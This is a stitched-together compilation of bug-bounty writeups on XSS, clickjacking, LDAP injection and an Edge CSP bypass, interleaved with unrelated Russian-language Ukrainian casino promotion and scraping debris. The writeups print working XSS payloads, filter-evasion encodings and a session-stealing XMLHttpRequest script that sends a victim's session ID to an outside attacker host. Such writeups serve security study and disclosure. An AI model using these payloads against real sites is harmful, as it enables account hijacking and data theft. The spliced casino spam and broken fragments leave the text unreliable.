applicable anymore.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSteam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper – The Hacker Blog The Hacker Blog FlashHTTPRequest JudasDNS XSS Hunter tarnish Home Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper June 07, 2018 Reading time ~5 minutes Home tarnish XSS Hunter JudasDNS FlashHTTPRequest | Follow @IAmMandatory Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper Summary The âSteam Inventory Helperâ Chrome extension version 1.13.6 suffered from both a DOM-based Cross-site Scripting (XSS) and a clickjacking vulnerability. By combining these vulnerabilities it is possible to gain JavaScript code execution in the highly-privileged context of the extensionâs background page. Due to the extension declaring the â â permission, this vulnerability can be exploited to hijack all sites that the victim is authenticated to. For example, if a user is authenticated to their bank, Steam, Gmail, and Facebook, this vulnerability could be used to access all of those accounts. This vulnerability is fixed in the latest version of the extension and all users should update (if Chrome has not done so for them automatically). The core of this issue is due to a DOM-based Cross-site Scripting (XSS) in â/html/bookmarks.htmlâ which is frameable from arbitrary web pages due to a the âweb_accessible_resourcesâ directive specifying this resource. By submitting an entry with the name of an XSS payload this page can be exploited to gain JavaScript execution in the context of the extension. Since a user is unlikely to paste an XSS payload into this page of their own will, the clickjacking vulnerability is used to redress the UI of the application to trick the victim into exploiting the issue. A pretext of a âBot Detectionâ page is used to get the victim to paste the payload (hidden inside of a larger âverification codeâ) and click the âAddâ button to exploit the issue. The full proof-of-concept can be seen in the video below. Proof-of-Concept Technical Details The first vulnerability is the DOM-based Cross-site Scripting (XSS) vulnerability in â/html/bookmarks.htmlâ, the following is the vulnerable JavaScript from the included âbookmarks.jsâ: $('#btAdd').click(function() { var btname = $('#txtName').val(); if ($('.custom-button .name').filter(function() { return $(this).text() === btname; }).length) return false; var span = $('<span class=\"custom-button\">'); span.html('<span class=\"name\">' + btname + '</span>'); span.append('<a href=\"javascript:void(0)\" title=\"remove\">x</a>'); span.attr('title', btname); span.data('id', (new Date().getTime())); $('div.custom-buttons .existing').append(span); save_options(); }); The above JavaScript takes the value of the âtxtNameâ text box and uses string concatenation to build HTML which is appended to the DOM via jQueryâs âappend()â function. This is the core of the XSS vulnerability since user input should always be contextually escaped to prevent injection of arbitrary markup. Normally, Chrome extension Content Security Policy (CSP) should prevent this vulnerability from being exploited. However, due to the loosening of this policy via âunsafe-evalâ and the use of jQueryâs DOM APIs, this was still able to be exploited. This is due to much of jQueryâs DOM APIs making use of âglobalEval()â , which automatically passes scripts to âeval()â upon appending to the DOM. While this is a serious vulnerability, on its own exploitation is fairly limited due to the user-interaction required to exploit it. The victim would have to open the page, paste a Cross-site Scripting (XSS) payload into the field, and click the âAddâ button to exploit it. In order to better weaponize this vulnerability we make use of a separate vulnerability (clickjacking) in order to bolster the attack. The following is an excerpt from the Chrome extensionâs manifest: ...trimmed for brevity... \"web_accessible_resources\": [ \"_locales/*\", \"bundle/*\", \"dist/*\", \"assets/*\", \"font/*\", \"html/bookmarks.html\", \"css/*.css\", \"js/*.js\", \"js/jquery/*.js\", \"js/lang/*\" ], ...trimmed for brevity... The above section demonstrates that the extension casts a wide net with its âweb_accessible_resourcesâ policy. By default Chrome extensions prevent framing and navigation to Chrome extension pages from arbitrary web pages as an extra security measure. This directive loosens this restriction, allowing for third party pages to navigate to and frame the specified resources. Much of the extensionâs privileged UI pages are specified under this directive, rendering the extension vulnerable to clickjacking. As can also be seen in the excerpt, the â/html/bookmarks.htmlâ page is also able to be framed and thus exploited via clickjacking. We abuse this to iframe this page in our web page, and overlay the frame with DOM elements to redress the layout. This makes it so that the victim is unaware that they are actually interacting with the extension below. The following animation demonstrates this effect: The above example demonstrates how we redress the UI to trick the victim. The âBot Detectionâ page provides a button to click to copy the âVerification codeâ to the victimâs clipboard. This âverification codeâ is actually a Cross-site Scripting (XSS) payload inside of a large amount of random hex bytes. This hides the payload from the victimâs view while they paste it into the extensionâs textbox, leading the victim into believing they are just copying and pasting a long random code. Finally, when the victim clicks the âAddâ button, the XSS fires. Root Cause & Further Thoughts There are two notable points of interest in this exploit. The first is that we were able to achieve DOM-XSS even with a fairly tight Content Security Policy (CSP) of the following: \"script-src 'self' 'unsafe-eval'; object-src 'self'\" While this CSP is fairly strong, it crumbles when combined with unsafe usage of jQueryâs DOM manipulation APIs such as â.html()â and â.append()â. This is something to look for when auditing Chrome extensions (and when writing them), if you make use of jQuery and have âunsafe-evalâ in your CSP â youâre playing with fire. The second interesting point is that clickjacking is a valid vulnerability which can absolutely affect Chrome extensions. All that is required is that a privileged Chrome extension UI page be exposed via the âweb_accessible_resourcesâ directive. After taking a look at many of the popular extensions on the Chrome store it seems many of them fall victim this simple mistake. Most of the time this is due to accidental overscoping via wildcarding of a privileged extension HTML page. This not only opens up extensions to attacks like clickjacking but can result in other vulnerabilities if the extension takes in user input from âlocation.hashâ, âpostMessageâ, etc. The default protection given to Chrome extensions via the navigation sandboxing should not be taken for granted by the extension developers.

Hi | by Yasser Gersy | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stealing HttpOnly Cookie via XSS Yasser Gersy 5 min read · Apr 8, 2018 -- 9 Listen Share Hi It’s very rarely that i write about my findings , But i decided to share this which may help you while writing pocs. First to be honest i’m one of the laziest hackers , i run my own scripts and common tools like wfuzz, sublister , nmap , etc and watch a random movie after the movie is finished i remember those who are running. I was fuzzing for common directories on a private website let’me call it jerico.com. jerico.com is a popular platform for blogging and it has more than 500 Million users. As usual , i ran Wfuzz with a wordlist wfuzz -c -z file,/root/Desktop/common-list --hc 404,400,302 https://jerico.com/FUZZ I was surprised to see the server returned 200 OK for the following end-point /account/settings/server When i requested this end-point in my browser , i was seeing my own account settings , i tried to view the source code of the website and concluded that the ‘server’ string was returned inside a script tag; <script> var user = ‘server’; </script> of course a very simple payload would be : '-alert(2)-' so the full url would be : https://jerico.com/account/settings/server‘-alert(2)-’ Boom , this is a very simple XSS,lucky ! :D Report Hi Team I found an xss at https://jerico.com/account/settings/server‘-alert(2)-’ happy fixing. Yes , i love reporting very simple issues without further investigating , but this time the team was unresponsive so i decided to get some attentions . One of the interesting points for me is the login . From my previous investigation , i found the login end-point was returning session cookie in the set-cookie Header in Response body If you tried to log in POST /Account/Login HTTP/1.1 HOST: jerico.com user[email]=fo@bar.com&user[password]=qwerty The response would be : HTTP/1.1 200 OK Set-Cookie:session=xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc; secure;httpOnly;domain=jersico.com {\"session\":\"xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc\"} The session cookie is marked as httpOnly So javascript would not access it But the session is returned in response body , Javascript would not access the cookie but it can access the response body and get the protected cookie . So to get the cookie , you need to issue a post request as login .and fetch the response body: POST /Account/Login HTTP/1.1 HOST: jerico.com ْX-Requested-With: XMLHttpRequest user[email]=fo@bar.com&user[password]=qwerty Are you kidding ? how would you get the email and password. I tried to issue a csrf request to the login end-point without any body parameters POST /Account/Login HTTP/1.1 Cookie: session=xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc; HOST: jerico.com And wow ! I was lucky the server was returning the same data in response body: HTTP/1.1 200 OK Set-Cookie:session=xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc; secure;httpOnly;domain=jersico.com {\"session\":\"xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc\"} Yeah ,The plan goes well. Issue an XHR request to login end-point Server returns sesssion id in response body Fetch the body and steal the session. here is the complete JS code to steal the cookie <script> var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == 4) { prompt('You are hacked , your session='+xhr.response);} document.location.replace('//yassergersy.com/stealer?data='+xhr.response'); } xhr.open('POST', '/account/login',true); xhr.withCredentials = true; xhr.send(null); </script> Encoding and sending the payload failed :( , most special characters were filtered : \",<>/\\ For me the following characters were enough to achieve my goal : '()-. We need to convert all special characters to String.fromCharCode(ascii) for a space = 32 String.fromCharCode(32) for a comma = 44 String.fromCharCode(44) so for alert(1337) the payload would be : eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 51, 51, 55, 41 )) Hold on , the , comma was filtered , the payload again will fail , we need another trick ,my jascript skills are not so good I tried to search google for javascript string concatenation And found concat() https://www.w3schools.com/jsref/jsref_concat_string.asp So instead of separating chars we can concatenate them using .concat() for example if we need to pass a,b we can concatenate b with a using: 'a’.concat('b') Of course this trick will not be used for alphabetical chars, it will be used for the special characters which the application sanitizes like \"<>/\\, So using concat and String.fromCharCode we can execute whatever JS code i decided to test the following payload <script> document.location.replace(\"//evil.net\"); </script> This was too boring to do it manually so i decided to write a python script to make it easier : https://gist.github.com/YasserGersy/a0fee5ce7422a558c84bfd7790d8a082 saving the payload to a file named payload.txt and executing the following command python Js2S.py payload.txt Resulted in generating : ''.concat(String.fromCharCode(60)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)).concat('document').concat(String.fromCharCode(46)).concat('location').concat(String.fromCharCode(46)).concat('replace').concat(String.fromCharCode(40)).concat(String.fromCharCode(34)).concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat('evil').concat(String.fromCharCode(46)).concat('net').concat(String.fromCharCode(34)).concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat(String.fromCharCode(60)).concat(String.fromCharCode(47)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)) This generated payload is considered as a single string and would not be filtered by the application , so we can pass it to eval and execute it in his case i needed this payload to be written in the document. So that i will use document.write(my_payload) instead of eval Anyone can use whatever function. so our final payload would be : https://jerico.com/Account/Settings/server`-dcument.write( <<generated-payload-by-python-script>>)'- Succeeded :D , let’s try a real world payload : $cat myrealworldpayload.txt . <script> var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == 4) {prompt('You are hacked , your session='+xhr.response);}} xhr.open('POST', '/account/login', true); xhr.send(null); </script> And python script generated the following : python Js2S.py myrealworldpayload.txt Output > ''.concat(String.fromCharCode(60)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)).concat('var').concat(String.fromCharCode(32)).concat('xhr').concat(String.fromCharCode(32)).concat(String.fromCharCode(61)).concat(String.fromCharCode(32)).concat('new').concat(String.fromCharCode(32)).concat(String.fromCharCode(88)).concat('MLHttpRequest').concat(String.fromCharCode(40)).concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat('xhr').concat(String.fromCharCode(46)).concat('onreadystatechange').concat(String.fromCharCode(32)).concat(String.fromCharCode(61)).concat(String.fromCharCode(32)).concat('function').concat(String.fromCharCode(40)).concat(String.fromCharCode(41)).concat(String.fromCharCode(32)).concat(String.fromCharCode(123)).concat(String.fromCharCode(32)).concat('if').concat(String.fromCharCode(32)).concat(String.fromCharCode(40)).concat('xhr').concat(String.fromCharCode(46)).concat('readyState').concat(String.fromCharCode(32)).concat(String.fromCharCode(61)).concat(String.fromCharCode(61)).concat(String.fromCharCode(32)).concat('4').concat(String.fromCharCode(41)).concat(String.fromCharCode(10)).concat(String.fromCharCode(32)).concat(String.fromCharCode(123)).concat('prompt').concat(String.fromCharCode(40)).concat(String.fromCharCode(39)).concat(String.fromCharCode(89)).concat('ou').concat(String.fromCharCode(32)).concat('are').concat(String.fromCharCode(32)).concat('hacked').concat(String.fromCharCode(32)).concat(String.fromCharCode(44)).concat(String.fromCharCode(32)).concat('your').concat(String.fromCharCode(32)).concat('session').concat(String.fromCharCode(61)).concat(String.fromCharCode(39)).concat(String.fromCharCode(43)).concat('xhr').concat(String.fromCharCode(46)).concat('response').concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(125)).concat(String.fromCharCode(125)).concat(String.fromCharCode(10)).concat('xhr').concat(String.fromCharCode(46)).concat('open').concat(String.fromCharCode(40)).concat(String.fromCharCode(39)).concat('POST').concat(String.fromCharCode(39)).concat(String.fromCharCode(44)).concat(String.fromCharCode(32)).concat(String.fromCharCode(39)).concat(String.fromCharCode(47)).concat('account').concat(String.fromCharCode(47)).concat('login').concat(String.fromCharCode(39)).concat(String.fromCharCode(44)).concat(String.fromCharCode(32)).concat('true').concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat('xhr').concat(String.fromCharCode(46)).concat('send').concat(String.fromCharCode(40)).concat('null').concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat(String.fromCharCode(60)).concat(String.fromCharCode(47)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)) Now replace the xxxxxxxxxxxxxx in the following url with the generated payload : https://jerico.com/Account/Settings/server`-dcument.write( <<xxxxxxxxxxxxx>>)'- The payload was too long and so the url , but does not matter it works : And i was able to steal the cookie. Press enter or click to view image in full size Cookie leaked to attacker’s site Conclusion : What my real poc which i sent to the team does ? The payload first get’s echoed inside a script tag. The payload executes first as a mathematical operation since i used ‘- as subtraction operation , which first will add the full malicious payload to the document to be executed without filtration. The malicious payload executes and issues a POST request and fetches the response to extract the session id and sends it to attacker website http://yassergersy.com which later will prompt it as in the above image. The attacker website receives the stolen session id and log it. To learn: Think in the box :D Chain bugs for higher impact.

White hat hacking to make legal money and read public security writeups and bug bounty stories for free! How I found A Surprising XSS Vulnerability on Oracle NetSuite ? Ronnie Joseph 2 min read · Mar 2, 2018 -- 3 Listen Share I was going around hunting and penetrating websites trying to get a few more bucks to save in my pocket which I later use to pay my college fees when I came across this wonderful vulnerability in Oracle Netsuite. Most sites actually try to secure the search bar more as they are well aware that it is always the target of attackers for finding reflected xss. I simply starting using the search bar of netsuite typing simple payloads. That’s when I remembered a type of reflected xss vulnerabilty using access keys. In my case if the victim pressed alt+shift+X , the XSS will fire. The vulnerable link was something like this — http://search.netsuite.com/socialsearch/query?cc=www&cn=netsuite&attrFilter= xlmav%22accesskey%3d%22x%22onclick%3d%22alert(document.domain)%22%2f%2fwzraf &q=k+hj+jh+j&submit= Now when the victim recieves the link and does a simple alt+shift+X ; xss gets triggered at search.netsuite.com (WOHOOO!) The security team was very fast to mitigate the issue and immediately removed the search functionality . The bug was fixed within a week. But I wonder why they asked me to delete the unlisted video POC ? Were they afraid of bug getting disclosed? God knows! Happy that the issue is resolved now. We need pudding after dinner;so is the case where we need POC for each bug. So here I am giving the unlisted video POC for all enthusiasts.

I would love to thank you for your support and wish success to all. There was a dream called Google and its HOF without thinking about reward or anything else. This vulnerability was the easiest vulnerability and more vulnerability has been rewarded so far. In 17/02/2018 I posted a post on Facebook. I think it’s the time to get Google HOF Because I always choose my target and do not go to another without ending it completely. My work as a lawyer also takes all my time and I only have 6 hours daily to do my hobby. On 08/03/2018 while browsing my gmail I clicked on even more from Google . You will find it in the up right side. Even more from Google Press enter or click to view image in full size Google products page After browsing the entire page I chose my target which is Google adwords. I logged in and started the test and moved from page to another and in fact I was playing didn't expect to find anything. I was added many payloads hoping that the magic alert would appear. I went to this page:- https://adwords.google.com/aw/conversions Press enter or click to view image in full size conversions I added a new conversation and in the conversation name i put this payload. “><svg/onload=alert(document.domain)>” @x .y Press enter or click to view image in full size conversation name After added the payload it pupped up many times and I thought it might be a self XSS so i clicked on prevent this message to continue and complete it. After completion i have clicked on Save Conversation. And the payload didn't pupped up any more because i chooses to prevent the XSS alert. I copied the entire URL and paste it into the browser in a new tab and this time I got shocked. The payload was stored on the page and works on all the latest versions of browsers. Press enter or click to view image in full size XSS pupped up in latest version of Firefox for Kali Linux And worked on Firefox in windows. Press enter or click to view image in full size XSS pupped up in latest version of Firefox for windows I made a cup of coffee and lit a cigarette and wrote the report and I made a video to explain the vulnerability and report it to Google and waited for the reply hoping not to be duplicated. I received a message from Google accepting the vulnerability and nice catch ( i loved it ). Press enter or click to view image in full size nice catch ( i loved it ) A very easy vulnerability and I got A good bounty from Google Vulnerability Reward Program and HOF. Press enter or click to view image in full size Rewarded $ 3133.7 Finally my name added to Google HOF. Press enter or click to view image in full size Google HOF Time line:- 08/03/2018 I have found the vulnerability and Email sent to Google 08/03/2018 Got automatically replay confirms they’ve received my message 08/03/2018 I received a message from Google accepting the vulnerability 08/03/2018 I received a message from Google nice catch ( i loved it ) 20/03/2018 closed the report and changed the status to Resolved 20/03/2018 Rewarded $ 3133.7 for Stored XSS in google adwords I would love to thank you all for your patience in reading my write up and for your continued support. specially :- @ak1t4 z3n @Brute and @IfrahIman_ I'm very happy to unlock this achievement and my goal for this year is perfect so far. sorry for my bad English but just i wanted to share this with yo u as always i doing.

This is my 1st write-up and also I am not good at XSS so forgive all mistakes . Recently I was testing a private site and in that site users can add their personal information . I noticed a Input there named Secret Key which allows user to process payments and store transaction information to an application. So I input a Normal payload :- “><img src=x onerror=prompt(document.domain)> and it got filtered and the page source was like :- <input type=\"text\" id=\"****\" name=\"****\" value=\"\">&lt;img img\" class=\"form-control\" rel=\"gp\" data-size=\"20\" data-character-set=\"a-z,A-Z,0-9\"> So from the source I understand that :- 1. quot (“) and greater-than (>) signs are not being filtered properly . 2. Malicious tags are being filtered . For that <img> become img img So I have 2 possible way to execute JavaScript . 1st one is somehow bypass the less than (<) filter and the 2nd one is adding a malicious HTML Attributes to execute JavaScript . I tried many way to bypass the less than(<) Character but was unable to do . So I processed with 2nd way by adding a Malicious HTML Attributes . So I entered below payload :- “ OnMouseOver=prompt(1) Response was :- <input type=\"text\" id=\"****\" name=\"****\" value=\"\" OnMouseOver=prompt&#40;\" class=\"form-control\" rel=\"gp\" data-size=\"20\" data-character-set=\"a-z,A-Z,0-9\"> So I was able to add a HTML Attributes but Brackets are being filtered properly . So I entered below payload :- “ OnMouseOver=prompt`1` Response was :- <input type=\"text\" id=\"****\" name=\"****\" value=\"\" OnMouseOver=prompt`1`\" class=\"form-control\" rel=\"gp\" data-size=\"20\" data-character-set=\"a-z,A-Z,0-9\"> But code Not executed . Take a closer look and the payload just need a quot (“) 🤔🤔🤔 :- “ OnMouseOver=”prompt`1` Response was :- <input type=\"text\" id=\"ipn_secret_keygen\" name=\"ipn_secret_keygen\" value=\"\"OnMouseOver=\"alert`1`\" class=\"form-control\" rel=\"gp\" data-size=\"20\" data-character-set=\"a-z,A-Z,0-9\"> Looks good . Now I took my Mouse pointer on the Input and the OnMouseOver Event executed the XSS Popup 🤩🤩🤩 Press enter or click to view image in full size XSS Executed . Thanks for reading .

A Bug Bounty Hunter from Bangladesh. Today I want to share with you a Stored XSS which I found in Snapchat. While i testing i found a Snapchat Ads Domain. So i decided to test that domain to found some bugs. When i go to the ADS domain i noticed a Setup Option, That means first we need to create a ADS Account. I PUT a HTML TAG into the BUSINESS NAME field and fill up the other field as random words and started a account. Press enter or click to view image in full size I created a Organization and they have a invite member option, where i can invite new members on my Organization . Press enter or click to view image in full size I invited my own email to joining as Organization member. After Opening my mail i saw the BUSINESS NAME field was vulnerable to HTML INJECTION Press enter or click to view image in full size Press enter or click to view image in full size I was looking!!! Simply again i back to the Ads domain and tried to created another account. I PUT a simple payload test\"><img src=x onerror=prompt<domain)> into the BUSINESS NAME field and Started a account. Now again i created a Organization and invited my own email to joining as Organization member. Quickly i opened my mail and clicked the invitation link. After clicking the link bingo!!!! Got the XSS POPUP. I Managed to achieve the Stored XSS on all browsers. Press enter or click to view image in full size I was Feeling!!!

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSearching for XSS found LDAP injection | nc-lp.com nc-lp.com Blog Why this name? Contact Searching for XSS found LDAP injection 5th Jun 2018 vulnerability While searching for bugs on target website, I decided to check if it was vulnerable to blind XSS. It turns out that the system was vulnerable to LDAP injection. Context Some time ago I was assessing a website for vulnerabilities and I was reviewing all the possible endpoints. While surfing, I encountered a registration form to the service, it was pretty packed with fields and it seemed your account needed to be valuated and activated by a human. Usually registering to websites is a trivial test: if the website is built with a CMS, the workflow is pretty secure, otherwise there are chances to find some trivial SQL injections. However, this time I tried to exploit some side-channel vulnerabilities: if someone needs to review my data, maybe I can inject something into their backend and extract some data? Blind XSS That \"something\" is a blind XSS payload , where the payload is not executed directly on target website, but rather on another interface (for example admin backend). Detecting blind XSS is a little more complicated than regular onces, since you don't know when (and if) the payload would be executed. A great online tool is XSS hunter , that allows you to setup a test subdomain that will collect a lot of info once the vulnerability is triggered. So, I grabbed one of the default payloads, put into the fields and... bummer Built-in WAF and elusion Ok, it seems that there's some kind of protection in place. After some reading, it seems that's the default WAF for .NET applications. However, when there are default settings there are known workarounds, too. Searching on Internet, I found this article about some tags being allowed even if the WAF is turned on. Long story short, tag <%tag is allowed, which could cause isseus with IE9. Ok, it's quite old, but maybe it's my lucky day? I put the payload into the form and... wait what? LDAP injection Looking for the error code 0x80005000 and the error text An invalid directory pathname was passed I learnt that they are related to an LDAP error. This means that the server was taking user input with filtering it and trying to create a new user inside the LDAP server. Oh Boy! Exploiting LDAP injections is tricky, since they are ultra-blind and they aren't so common, I had to take back from the shelf my copy of The WebApplication Hacker's Handbook to refresh my memory. Luckly the error page was enough for a valid POC, so I reported it back. Conclusions If I had to sum up the whole experience in one phrase, I'd chose Expect the unexpected . Additionally, that's another reminder that you should never ever trust user input, even if there are protections in place. Related Posts Comments: Blog Comments powered by Disqus .

The bypass was done by abusing the browser’s XSS filter. This is quite ironical, because both XSS filter and CSP are designed to protect users from XSS attacks, but this vulnerability allows attackers to abuse one XSS protection mechanism to bypass another. XSS filter was first introduced in IE 8. The purpose of a XSS filter is to mitigate reflective XSS attacks. The XSS filter of IE/Edge roughly works in this way: when the browser loads a URL, the XSS filter first checks if some parameters of the URL may contain XSS payloads, using a set of predefined regular expressions. For instance, http://example.com/index.php?id=100 is clearly harmless, but for a URL like http://example.com/index.php?id=<script>alert(1)</script> , the value of parameter id may be a XSS payload. Then, to determine whether it is a reflective XSS attack exactly, IE/Edge check if the returned HTML contains the substring <script>alert(1)</script> . If it does, IE/Edge assume it is reflected from the id parameter. Notice that this assumption may not be true: what if <script>alert(1)</script> is hardcoded in the page, and the id parameter actually doesn’t have any effect? There’re two modes for XSS filter: default mode and block mode. Sites can enable the block mode by setting HTTP header: X-XSS-Protection: 1; mode=block”. In the block mode, IE/Edge block the entire HTML from rendering. In the default mode, IE/Edge try to destroy XSS payloads by modifying the corresponding HTML tags. E.g. if Edge assumes <script>alert(1)</script> is a XSS, it changes this element to <sc#ipt>alert(1)</script> . Thus, the DOM parser won’t parse this segment as a <script> element, so it won’t execute. Now let’s see the vulnerability, CVE-2017–0135 . There are two ways for a website to set a Content Security Policy: via Content-Security-Policy HTTP response header field, or via <meta> tag. An example of such meta element is: <meta http-equiv=”Content-Security-Policy” content=”script-src ‘self’”> . Now suppose here is the HTML for URL http://example.com/xss.html: <!DOCTYPE html> <html> <head> <title>CSP Test</title> <meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'\"> </head> <body> <script>alert(document.domain);</script> </body> </html> The CSP should block alert(document.domain) from executing. To bypass the CSP, let’s ask users to visit http://example.com/xss.html?<meta http-equiv=”Content-Security-Policy” content=”script-src ‘self’”> (Just append meta element as a parameter to the URL.) Then, by default, Edge’s XSS filter simply modifies the meta tag to <me#a http-equiv=”Content-Security-Policy” content=”script-src ‘self’”> , which kills the CSP, and alert is executed.

It’s fixed by blocking the whole HTML page, when the XSS filter detects the query string matches any meta element, regardless of modes. Although this vulnerability has been fixed, it’s still a good idea to set “X-XSS-Protection: 1; mode=block”. Also CSP policies delivered via HTTP headers are not vulnerable to this bypass attack.

Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции.

Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах.

Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов.

Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр.

After getting some cool swag they announced their bounty program.I thought why not some bounty also? As bcz limited scope in DEV I start looking for XSS.I dropped some common payload like img src/svg onload bla bla bla but their firewall blocking me all the time.I put some advanced payload and see the response is different from other payloads.Like below picture, Press enter or click to view image in full size i-frame vulnerable This was interesting,I thought may be i-frame payloads can trigger XSS here.Bit moment later I put advanced i-frame payload and got the stored one that can bypassed their filtering protection.Payload: <iframe src=”data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E”></iframe> Why this payload??

In this line of direction, SharePoint provides a feature called “ Follow ” a site in order to get updates on site’s activity in your newsfeed. One way to follow a site is to click on the “ Follow ” feature available at the top right of the page At this time, SharePoint sends a POST request to the following end-point: bbmsft.sharepoint.com/_vti_bin/client.svc/ProcessQuery ( bbmsft is the tenant name in my case and this will be different in your case). I played around with that POST request but was unable to find something interesting. I observed that this is not the only way to follow a site. You can also share your site(s) with others by using the Share feature available at the top right corner. Once you send out Share invitation, on the receiving end email The URL has two GET parameters i.e., FollowSite=1 and SiteName=<AnySiteNameGoesHere> . The FollowSite GET parameter holds a Boolean value of 0 or 1. 0 for not following and 1 for following . It is a sort of flag. The GET parameter SiteName is of our interest. It is reflected back as a part of script context like the following (watch out for the keyword ReflectionHere ). In real life, this would be the name of site you want to follow. <script type=”text/javascript”> //<![CDATA[ … SP.SOD.executeFunc(‘followingcommon.js’, ‘FollowSiteFromEmail’, function() { FollowSiteFromEmail(‘ReflectionHere’); }); … //]]> </script> As you can see in the above code, the developers’re using single quote around ReflectionHere and I found that potentially dangerous characters like ‘, < , > and / etc were not encoded. In order to keep it simple, the XSS payload like ‘-confirm(document.domain)-’ should do the job for you. Further, I noticed that the above inline JavaScript code snippet only appears or becomes a part of DOM if GET parameters ( FollowSite and SiteName ) are present in the URL.

Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты.

